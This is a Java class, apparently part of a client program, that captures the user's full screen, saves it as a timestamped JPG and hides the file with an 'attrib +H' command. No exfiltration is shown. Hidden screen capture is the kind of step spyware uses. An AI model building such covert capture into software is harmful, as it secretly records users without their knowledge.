/**
 * @author Shimrit Hoori, Dror Ventura
 * This class handles the screen capture of the user machine     
 *
 */
package client;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.util.Calendar;

public class PrintScreen {
	
	/**
	 * Captures user screen and saves it on the current directory
	 * @return	the image captured
	 * @throws HeadlessException
	 * @throws AWTException
	 * @throws IOException
	 */
    public File printScreen() throws HeadlessException, AWTException, IOException {
        Calendar calendar =  Calendar.getInstance();
        Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage capture = new Robot().createScreenCapture(screen);

        String timeStamp = calendar.getTime().toString().split(" ")[3];
        String filename = "sc_" + trimColon(timeStamp) +".jpg";

        File image = new File(filename);
        Runtime.getRuntime().exec("attrib +H " + filename);
        ImageIO.write(capture, "jpg", image);

        return image;
    }
    
    /**
     * remove colons from String	 
     * @param toTrim	string to extract colons from
     * @return	the trimmed string
     */
    private String trimColon(String toTrim) {
        String[] split = toTrim.split(":");
        return split[0] + "-" + split[1]+ "-" +split[2];
    }
}
